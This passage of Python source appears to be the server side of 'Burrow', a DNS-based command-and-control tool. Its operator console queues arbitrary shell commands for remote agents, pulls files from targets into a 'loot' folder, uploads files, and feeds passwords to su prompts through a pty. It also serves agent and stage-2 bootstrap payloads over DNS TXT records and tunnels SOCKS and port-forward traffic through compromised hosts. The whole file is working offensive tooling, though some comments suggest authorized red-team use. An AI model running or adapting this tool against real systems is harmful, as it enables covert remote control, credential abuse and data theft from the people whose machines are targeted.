                lines.append("client %s  %s mode  last poll %ds ago  polls=%d  unacked answers=%d  "
                             "control queued=%d  answer limit %d%s%s" % (
                                 c.cid, c.mode, int(now - c.last_seen), c.polls, len(c.poll_cache),
                                 len(c.ctl), c.cap_limit,
                                 "  <- new connections" if c.cid == self.active and not c.quitting else "",
                                 "  (told to stop)" if c.quitting else ""))
                if not c.streams:
                    lines.append("    no open streams")
                for s in c.streams.values():
                    lines.append("  %3d  %s:%d  %s  up %d B  down %d B  waiting-down %d B  %.0fs" % (
                        s.sid, s.host, s.port,
                        "connecting" if not s.connected.is_set() else ("open" if s.ok else "failed"),
                        s.up_total, s.down_total, s.down_bytes, now - s.opened))
        return lines

    # ---------- local listeners ----------

    def start_socks(self, port):
        return self._listen(port, "socks", None, None)

    def add_forward(self, lport, host, rport):
        return self._listen(lport, "forward", host, rport)

    def _listen(self, port, kind, host, rport):
        with self.lock:
            if port in self.listeners:
                l = self.listeners[port]
                if l["kind"] == kind and l["host"] == host and l["rport"] == rport:
                    return "already listening on %s:%d" % (self.listen, port)
                return "port %d is already used by another listener; stop it first" % port
            ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                ls.bind((self.listen, port))
                ls.listen(64)
            except OSError as exc:
                ls.close()
                return "cannot listen on %s:%d: %s" % (self.listen, port, exc)
            self.listeners[port] = {"sock": ls, "kind": kind, "host": host, "rport": rport}
        if kind == "socks":
            handler = lambda c, a: socks_session(self, c, a)
        else:
            handler = lambda c, a, h=host, p=rport: forward_session(self, c, h, p)
        threading.Thread(target=accept_loop, args=(ls, handler), daemon=True).start()
        if kind == "socks":
            return "SOCKS5 listening on %s:%d" % (self.listen, port)
        return "forward %s:%d -> %s:%d" % (self.listen, port, host, rport)

    def stop_listener(self, port=None, kind=None):
        """Close listeners by port, or all of one kind. Returns the ports closed."""
        closed = []
        with self.lock:
            for p, l in list(self.listeners.items()):
                if (port is not None and p != port) or (kind is not None and l["kind"] != kind):
                    continue
                try:
                    l["sock"].close()
                except OSError:
                    pass
                del self.listeners[p]
                closed.append(p)
        return closed


# ---------- SOCKS5 and port forwards ----------

def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        part = conn.recv(n - len(buf))
        if not part:
            raise ConnectionError("eof")
        buf += part
    return buf


def socks_reply(conn, code):
    try:
        conn.sendall(bytes([5, code, 0, 1]) + b"\0" * 6)
    except OSError:
        pass


def relay(tunnel, s, conn):
    conn.settimeout(None)
    try:
        while True:
            data = conn.recv(4096)
            if not data or not tunnel.push_down(s, data):
                break
    except OSError:
        pass
    tunnel.close_from_local(s)


def socks_session(tunnel, conn, _addr):
    s = None
    try:
        conn.settimeout(15)
        ver, nmeth = recv_exact(conn, 2)
        recv_exact(conn, nmeth)
        if ver != 5:
            return
        conn.sendall(b"\x05\x00")
        ver, cmd, _rsv, atyp = recv_exact(conn, 4)
        if cmd != 1:
            socks_reply(conn, 7)
            return
        if atyp == 1:
            host = socket.inet_ntoa(recv_exact(conn, 4))
        elif atyp == 3:
            host = recv_exact(conn, recv_exact(conn, 1)[0]).decode("ascii", "replace")
        else:
            socks_reply(conn, 8)
            return
        port = struct.unpack("!H", recv_exact(conn, 2))[0]
        if not HOST_RE.match(host):
            socks_reply(conn, 1)
            return
        s = tunnel.open_stream(host, port, conn)
        if s is None:
            tunnel.log("SOCKS request for %s:%d but no tunnel client is polling" % (host, port))
            socks_reply(conn, 1)
            return
        if not s.connected.wait(45):
            socks_reply(conn, 1)
            tunnel.close_from_local(s, "connect timed out")
            return
        if not s.ok:
            socks_reply(conn, 5)
            tunnel.discard(s, "connect refused on the target")
            return
        conn.sendall(b"\x05\x00\x00\x01" + b"\0" * 6)
        tunnel.mark_ready(s)
        relay(tunnel, s, conn)
    except (OSError, ConnectionError, ValueError):
        if s is not None:
            tunnel.close_from_local(s)
    finally:
        try:
            conn.close()
        except OSError:
            pass


def forward_session(tunnel, conn, host, port):
    s = tunnel.open_stream(host, port, conn)
    try:
        if s is None:
            tunnel.log("forward to %s:%d but no tunnel client is polling" % (host, port))
            return
        if not s.connected.wait(45):
            tunnel.close_from_local(s, "connect timed out")
            return
        if not s.ok:
            tunnel.discard(s, "connect refused on the target")
            return
        tunnel.mark_ready(s)
        relay(tunnel, s, conn)
    finally:
        try:
            conn.close()
        except OSError:
            pass


def accept_loop(ls, handler):
    while True:
        try:
            conn, addr = ls.accept()
        except OSError:
            if ls.fileno() < 0:
                return                        # listener closed
            time.sleep(0.2)
            continue
        threading.Thread(target=handler, args=(conn, addr), daemon=True).start()


# ======================================================================
# DNS listeners
# ======================================================================

def serve_udp(sock, burrow):
    # Test-only path impairments, never set in real use:
    drop_over = int(os.environ.get("DNS_TEST_MAXUDP", "0"))     # drop replies over N bytes (512-byte firewall)
    loss = float(os.environ.get("DNS_TEST_LOSS", "0"))          # drop this fraction of replies at random
    jitter = float(os.environ.get("DNS_TEST_JITTER", "0"))      # delay each reply 0..N s at random (reorders)
    while True:
        try:
            data, addr = sock.recvfrom(4096)
        except OSError:
            continue
        resp = burrow.dispatch(data, addr, False)
        if not resp or (drop_over and len(resp) > drop_over):
            continue
        if loss and random.random() < loss:
            continue
        if jitter:
            threading.Timer(random.random() * jitter, sock.sendto, (resp, addr)).start()
        else:
            try:
                sock.sendto(resp, addr)
            except OSError:
                pass


def serve_tcp(ls, burrow):
    while True:
        try:
            conn, addr = ls.accept()
        except OSError:
            time.sleep(0.2)
            continue
        threading.Thread(target=tcp_queries, args=(conn, addr, burrow), daemon=True).start()


def tcp_queries(conn, addr, burrow):
    try:
        conn.settimeout(10)
        while True:
            n = struct.unpack("!H", recv_exact(conn, 2))[0]
            data = recv_exact(conn, n)
            resp = burrow.dispatch(data, addr, True)
            if resp:
                conn.sendall(struct.pack("!H", len(resp)) + resp)
    except (OSError, ConnectionError, struct.error):
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


# ======================================================================
# Console
# ======================================================================

HELP = """\
commands (anything else is a shell command for the selected agent):
  agents                      list agents, * marks the selected one
  use <cid>                   select an agent
  info                        details of the selected agent
  sleep <seconds>             idle poll interval of the selected agent (burrowclient.pl)
  pty [-t secs] <command>     run <command> under a terminal and type a password at its prompt
  get <remote> [local]        copy a file from the target into ./loot/ (or local)
  put <local> <remote>        copy a local file onto the target (it is written there: log it)
  probe [sizes]               which TXT answer sizes reach the agent, by nslookup, raw UDP, EDNS (burrowclient.pl)
  socks <port> | stop | status   SOCKS5 proxy on 127.0.0.1:<port> carried by the agent's tunnel (burrowclient.pl)
  forward <lport>:<host>:<rport> | forward stop <lport>   plain port forward over the same tunnel
  streams                     tunnel listeners, clients and open connections
  exit                        stop the selected agent (and its tunnel)
  quit                        stop this server (agents keep polling)
  help                        this text
Up/Down browse the command history, Tab completes commands and agent ids, Ctrl-C clears the line."""


class Console(object):
    def __init__(self, burrow, logpath=None, histpath=None):
        self.b = burrow
        burrow.console = self
        self.olock = threading.RLock()
        self.reading = False
        self.tty = sys.stdin.isatty() and sys.stdout.isatty()
        self.rl = None
        self.rllib = None
        self.histpath = histpath
        self.logf = None
        if logpath:
            self.logf = open(logpath, "a")
        if self.tty:
            self._setup_readline()
        self.commands = collections.OrderedDict([
            ("help", self.cmd_help), ("agents", self.cmd_agents), ("clients", self.cmd_agents),
            ("use", self.cmd_use), ("info", self.cmd_info), ("sleep", self.cmd_sleep),
            ("pty", self.cmd_pty), ("get", self.cmd_get), ("put", self.cmd_put),
            ("probe", self.cmd_probe), ("socks", self.cmd_socks), ("forward", self.cmd_forward),
            ("streams", self.cmd_streams), ("exit", self.cmd_exit), ("quit", None),
        ])

    # ---------- readline ----------

    def _setup_readline(self):
        try:
            import readline
        except ImportError:
            return
        self.rl = readline
        if "libedit" in (readline.__doc__ or ""):
            readline.parse_and_bind("bind ^I rl_complete")
        else:
            readline.parse_and_bind("tab: complete")
            for name in ("libreadline.so.8", "libreadline.so.7", "libreadline.so.6", "libreadline.so"):
                try:
                    lib = ctypes.CDLL(name)
                    if hasattr(lib, "rl_on_new_line"):
                        self.rllib = lib          # lets us redraw the line being typed after a log line
                        break
                except OSError:
                    continue
        readline.set_completer(self._complete)
        readline.set_completer_delims(" \t\n")
        readline.set_history_length(2000)
        if self.histpath:
            try:
                readline.read_history_file(self.histpath)
            except (IOError, OSError):
                pass

    def _complete(self, text, state):
        try:
            buf = self.rl.get_line_buffer()
            words = buf.split()
            if not words or (len(words) == 1 and not buf.endswith(" ")):
                cands = [w for w in self.commands if w.startswith(text)]
            elif words[0] == "use":
                cands = [c for c in self.b.agents if c.startswith(text)]
            elif words[0] in ("socks", "forward") and len(words) <= 2:
                cands = [w for w in ("stop", "status") if w.startswith(text)]
            else:
                cands = []
            return cands[state]
        except (IndexError, Exception):
            return None

    def save_history(self):
        if self.rl and self.histpath:
            try:
                self.rl.write_history_file(self.histpath)
            except (IOError, OSError):
                pass

    # ---------- output ----------

    def prompt(self):
        sel = self.b.selected
        return "burrow %s> " % sel if sel else "burrow> "

    def emit(self, text, log=True):
        """Print a line (or lines) above the line being typed, and log it."""
        if not text.endswith("\n"):
            text += "\n"
        with self.olock:
            if self.reading and self.tty:
                sys.stdout.write("\r\x1b[K" + text)
                if self.rllib is not None:
                    self.rllib.rl_on_new_line()
                    self.rl.redisplay()
                else:
                    sys.stdout.write(self.prompt() + (self.rl.get_line_buffer() if self.rl else ""))
            else:
                sys.stdout.write(text)
            sys.stdout.flush()
            if log and self.logf:
                ts = time.strftime("%Y-%m-%d %H:%M:%S ")
                self.logf.write("".join(ts + ln + "\n" for ln in text.rstrip("\n").split("\n")))
                self.logf.flush()

    def say(self, text, log=True):
        self.emit(text, log)

    # ---------- loop ----------

    def run(self):
        while True:
            try:
                self.reading = True
                try:
                    line = input(self.prompt())
                finally:
                    self.reading = False
            except EOFError:
                print()
                break
            except KeyboardInterrupt:
                print()
                continue
            line = line.strip()
            if not line:
                continue
            if self.logf:
                self.logf.write(time.strftime("%Y-%m-%d %H:%M:%S ") + self.prompt() + line + "\n")
                self.logf.flush()
            word, _, rest = line.partition(" ")
            rest = rest.strip()
            if word == "quit":
                break
            try:
                if word in self.commands:
                    self.commands[word](rest)
                else:
                    self.shell(line)
            except KeyboardInterrupt:
                print()
            except Exception as exc:
                self.say("[!] command failed: %r" % (exc,))
        self.save_history()

    # ---------- helpers ----------

    def agent(self):
        with self.b.lock:
            a = self.b.agents.get(self.b.selected)
        if a is None:
            self.say("no agent has checked in yet")
        return a

    def needs_v2(self, a, what):
        if a.version < 2:
            self.say("%s needs burrowclient.pl on the target; %s is a basic agent (burrowclient.sh or an older one)" % (what, a.cid))
            return True
        return False

    def queue(self, a, text, meta=None, note=None):
        tid = self.b.queue_task(a, text, meta)
        if tid is None:
            self.say("command too long for one DNS answer (%d bytes encoded, limit %d) and the basic agent %s "
                     "cannot fetch transfers; split it up" % (len(base64.b64encode(text.encode())), MAX_TASK_TXT, a.cid))
            return None
        self.say("queued task %d for %s%s" % (tid, a.cid, (": " + note) if note else ""))
        return tid

    # ---------- commands ----------

    def shell(self, line):
        a = self.agent()
        if a is None:
            return
        self.queue(a, line)

    def cmd_help(self, _rest):
        self.say(HELP)

    def cmd_agents(self, _rest):
        with self.b.lock:
            if not self.b.agents:
                self.say("no agents yet")
            for cid, a in self.b.agents.items():
                self.say("%s %s  %s  last seen %s  polls=%d  queued=%d  via %s" % (
                    "*" if cid == self.b.selected else " ", cid, a.describe(), ago(a.last_seen),
                    a.polls, len(a.tasks), a.addr[0]))

    def cmd_use(self, rest):
        with self.b.lock:
            if rest in self.b.agents:
                self.b.selected = rest
                self.say("selected %s" % rest)
            else:
                self.say("unknown agent %r" % rest)

    def cmd_info(self, _rest):
        a = self.agent()
        if a is None:
            return
        self.say("agent %s: %s" % (a.cid, a.describe()))
        self.say("  first seen %s, last seen %s, %d polls, %d task(s) queued, %d output(s) in progress" % (
            time.strftime("%H:%M:%S", time.localtime(a.first_seen)), ago(a.last_seen), a.polls,
            len(a.tasks), len(a.outputs)))
        self.say("  queries arrive via resolver %s" % a.addr[0])
        self.say("  tunnel client polling: %s" % ("yes" if self.b.tunnel.polling(a.cid) else "no"))

    def cmd_sleep(self, rest):
        a = self.agent()
        if a is None or self.needs_v2(a, "sleep"):
            return
        try:
            secs = float(rest)
            if not 0.2 <= secs <= 3600:
                raise ValueError
        except ValueError:
            self.say("usage: sleep <seconds between polls, 0.2 to 3600>")
            return
        self.queue(a, "@sleep %g" % secs, note="poll interval %g s" % secs)

    def cmd_pty(self, rest):
        limit = PTY_DEFAULT_T
        m = re.match(r"^-t\s+(\d+)\s+(.*)$", rest, re.S)
        if m:
            limit, rest = int(m.group(1)), m.group(2).strip()
        if not rest:
            self.say('usage: pty [-t seconds] <command that asks for a password>\n'
                     '       e.g. pty su - root -c "id; hostname"      (asks you for the password, hidden)')
            return
        if limit > PTY_MAX_T:
            self.say("-t capped at %d: the agent kills a task at 60 s" % PTY_MAX_T)
            limit = PTY_MAX_T
        a = self.agent()
        if a is None or self.needs_v2(a, "pty"):
            return
        try:
            password = getpass.getpass("password to type at the prompt (empty for none): ")
        except EOFError:
            password = ""
        if "\n" in password:
            self.say("the password cannot contain a newline")
            return
        self.queue(a, "@pty %d\n%s\n%s" % (limit, password, rest), note="pty, %d s limit: %s" % (limit, rest))

    def cmd_get(self, rest):
        parts = rest.split()
        if not parts or len(parts) > 2:
            self.say("usage: get <remote path> [local path]   (default: ./%s/<basename>)" % GET_DIR)
            return
        remote = parts[0]
        local = parts[1] if len(parts) == 2 else os.path.join(GET_DIR, os.path.basename(remote) or "file")
        a = self.agent()
        if a is None:
            return
        meta = {"kind": "get", "remote": remote, "local": local}
        if a.version >= 2:
            self.queue(a, "@get " + remote, meta, note="get %s -> %s" % (remote, local))
        else:
            self.queue(a, "cat " + sh_quote(remote), meta,
                       note="get %s -> %s (basic agent: cat, 30 KB limit, no checksum)" % (remote, local))

    def cmd_put(self, rest):
        parts = rest.split()
        if len(parts) != 2:
            self.say("usage: put <local path> <remote path>")
            return
        local, remote = parts
        try:
            with open(local, "rb") as f:
                raw = f.read()
        except (IOError, OSError) as exc:
            self.say("cannot read %s: %s" % (local, exc))
            return
        if len(raw) > 2 * 1024 * 1024:
            self.say("%s is %d bytes; keep uploads under 2 MB (about %d DNS answers)" % (
                local, len(raw), len(raw) * 2 // CHUNK_HEX))
            return
        a = self.agent()
        if a is None or self.needs_v2(a, "put"):
            return
        digest = hashlib.md5(raw).hexdigest()
        xid = self.b.new_transfer(raw, "put %s" % remote)
        n = len(self.b.transfers[xid].chunks)
        tid = self.queue(a, "@put %s %d %s" % (xid, n, remote), note="put %s (%d bytes, md5 %s) -> %s, %d chunks" % (
            local, len(raw), digest, remote, n))
        if tid is not None:
            self.say("remember to log %s on the target in the artifacts list" % remote)

    def cmd_probe(self, rest):
        a = self.agent()
        if a is None or self.needs_v2(a, "probe"):
            return
        sizes = rest.replace(" ", ",") if rest else PROBE_SIZES
        if not re.match(r"^\d+(,\d+)*$", sizes):
            self.say("usage: probe [size,size,...]   default %s" % PROBE_SIZES)
            return
        self.queue(a, "@probe " + sizes, note="path probe, answer sizes %s; takes up to a minute" % sizes)

    def cmd_socks(self, rest):
        t = self.b.tunnel
        if rest in ("", "status"):
            self.cmd_streams("")
            return
        if rest == "stop":
            a = self.agent()
            told, older = t.quit_clients(a.cid if a is not None and a.version >= 2 else None)
            closed = t.stop_listener(kind="socks")
            if a is not None and a.version >= 2 and "t" in a.flags:
                self.queue(a, "@tunnel stop", note="stop the tunnel child")
            self.say("socks: listener%s closed: %s; tunnel client(s) told to stop: %s" % (
                "s" if len(closed) != 1 else "", ", ".join(str(p) for p in closed) or "none", ", ".join(told) or "none"))
            if older:
                self.say("tunnel client(s) %s run an older version without stop support: end them on the target "
                         "(ps -ef, kill)" % ", ".join(older))
            return
        try:
            port = int(rest)
            if not 1 <= port <= 65535:
                raise ValueError
        except ValueError:
            self.say("usage: socks <port> | socks stop | socks status")
            return
        self.say(t.start_socks(port))
        a = self.agent()
        if a is None:
            return
        if a.version < 2:
            self.say("%s is a basic agent and has no tunnel: deploy burrowclient.pl; the listener stays open" % a.cid)
            return
        if "t" in a.flags and t.polling(a.cid):
            self.say("tunnel client %s is already polling; the proxy is usable now" % a.cid)
            return
        self.queue(a, "@tunnel start", note="start the tunnel child; wait for '[tun] tunnel client %s active'" % a.cid)

    def cmd_forward(self, rest):
        t = self.b.tunnel
        m = re.match(r"^stop\s+(\d+)$", rest)
        if m:
            closed = t.stop_listener(port=int(m.group(1)))
            self.say("forward %s" % ("closed" if closed else "not found"))
            return
        m = re.match(r"^(\d+):([A-Za-z0-9._-]+):(\d+)$", rest)
        if not m:
            self.say("usage: forward <lport>:<host>:<rport> | forward stop <lport>")
            return
        self.say(t.add_forward(int(m.group(1)), m.group(2), int(m.group(3))))
        a = self.agent()
        if a is not None and a.version >= 2 and not t.polling(a.cid):
            self.queue(a, "@tunnel start", note="start the tunnel child")

    def cmd_streams(self, _rest):
        for line in self.b.tunnel.status_lines():
            self.say(line)

    def cmd_exit(self, _rest):
        a = self.agent()
        if a is None:
            return
        if a.version >= 2:
            self.b.tunnel.quit_clients(a.cid)
        self.queue(a, "exit", note="agent stops at its next poll")


# ======================================================================
# main
# ======================================================================

BANNER = r"""
 ____                                        
| __ ) _   _ _ __ _ __ _____      __         
|  _ \| | | | '__| '__/ _ \ \ /\ / /         
| |_) | |_| | |  | | | (_) \ V  V /          
|____/ \__,_|_|  |_|  \___/ \_/\_/   v%s      DNS command channel and SOCKS tunnel
"""


def default_route_address():
    """This host's address on the default route (no packet is sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.0.2.1", 53))
        addr = s.getsockname()[0]
        s.close()
        return addr
    except OSError:
        return None


def main():
    ap = argparse.ArgumentParser(description="Burrow %s: DNS command channel and SOCKS tunnel, server side" % VERSION)
    ap.add_argument("domain", help="delegated zone, e.g. tunnel.example.com")
    ap.add_argument("--ns", default="", help="name your NS record points at, e.g. ns1.example.com")
    ap.add_argument("--serve", default=None, metavar="FILE",
                    help="offer FILE for download as hex chunks f0, f1, ... (default: burrowclient.pl next to this script)")
    ap.add_argument("--boot", default="", metavar="FILE",
                    help="serve FILE (stage-2 Perl, <= 400 bytes, no double quotes or backslashes) as TXT b.ZONE")
    ap.add_argument("--bind", default="0.0.0.0", help="address for the DNS listeners (default all)")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--no-tcp", action="store_true", help="do not listen on TCP (then answers over 512 bytes are lost)")
    ap.add_argument("--socks", type=int, default=0, metavar="PORT", help="open the SOCKS5 listener at start")
    ap.add_argument("--forward", action="append", default=[], metavar="LPORT:HOST:RPORT",
                    help="open a port forward at start, repeatable")
    ap.add_argument("--listen", default="127.0.0.1", help="address for SOCKS/forward listeners (default 127.0.0.1)")
    ap.add_argument("--log", default="burrow.log", metavar="FILE", help="console log with timestamps (default burrow.log)")
    ap.add_argument("--no-log", action="store_true")
    ap.add_argument("--history", default=os.path.expanduser("~/.burrow_history"), metavar="FILE")
    ap.add_argument("--version", action="version", version="burrow " + VERSION)
    args = ap.parse_args()

    zone = args.domain.strip(".").lower()
    serve_path = args.serve
    if serve_path is None and os.path.exists(AGENT_SOURCE):
        serve_path = AGENT_SOURCE
    chunks = None
    if serve_path:
        raw = open(serve_path, "rb").read()
        chunks = chunks_from_bytes(raw)
        print("serving %s: %d bytes, md5 %s, as %d chunks f0..f%d" % (
            os.path.basename(serve_path), len(raw), hashlib.md5(raw).hexdigest(), len(chunks), len(chunks) - 1))
    boot = None
    if args.boot:
        boot = open(args.boot).read().strip()
        if len(boot) > 400 or '"' in boot or "\\" in boot:
            sys.exit("--boot file must be <= 400 bytes with no double quotes or backslashes")
        print("serving bootstrap %s (%d bytes) as TXT b.%s" % (args.boot, len(boot), zone))

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        udp.bind((args.bind, args.port))
    except PermissionError:
        sys.exit("need root (or CAP_NET_BIND_SERVICE) to bind UDP/%d" % args.port)
    except OSError as exc:
        sys.exit("cannot bind UDP %s:%d: %s (try --bind <this VM's private address>)" % (args.bind, args.port, exc))
    tcp, tcp_addr = None, None
    if not args.no_tcp:
        candidates = [args.bind]
        if args.bind == "0.0.0.0":
            own = default_route_address()
            if own:
                candidates.append(own)       # a local stub resolver (systemd-resolved) often holds 127.0.0.53:53
        for addr in candidates:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                tcp.bind((addr, args.port))
                tcp.listen(32)
                tcp_addr = addr
                break
            except OSError as exc:
                tcp.close()
                tcp, last_err = None, exc
        if tcp is None:
            print("warning: TCP port %d not available (%s): answers over 512 bytes cannot be retried over TCP; "
                  "use --bind <this host's address> or --no-tcp" % (args.port, last_err))

    burrow = Burrow(zone, args.ns.strip(".").lower(), chunks, boot, args.listen)
    console = Console(burrow, None if args.no_log else args.log, args.history)
    threading.Thread(target=serve_udp, args=(udp, burrow), daemon=True).start()
    if tcp is not None:
        threading.Thread(target=serve_tcp, args=(tcp, burrow), daemon=True).start()
    threading.Thread(target=burrow.housekeeping, daemon=True).start()

    console.say(BANNER % VERSION, log=False)
    console.say("listening on udp %s:%d%s for *.%s%s" % (
        args.bind, args.port,
        (" and tcp %s:%d" % (tcp_addr, args.port)) if tcp else " (no tcp)", zone,
        (", NS %s" % args.ns) if args.ns else ", no --ns: zone NS/SOA queries get no answer"))
    if args.socks:
        console.say(burrow.tunnel.start_socks(args.socks))
    for spec in args.forward:
        try:
            lport, host, rport = spec.split(":")
            console.say(burrow.tunnel.add_forward(int(lport), host, int(rport)))
        except ValueError:
            sys.exit("bad --forward %r, want LPORT:HOST:RPORT" % spec)
    if not args.no_log:
        console.say("console log: %s" % os.path.abspath(args.log), log=False)
    console.say("type 'help' for the commands; a shell command runs on the selected agent once one checks in", log=False)
    console.run()


if __name__ == "__main__":
    main()
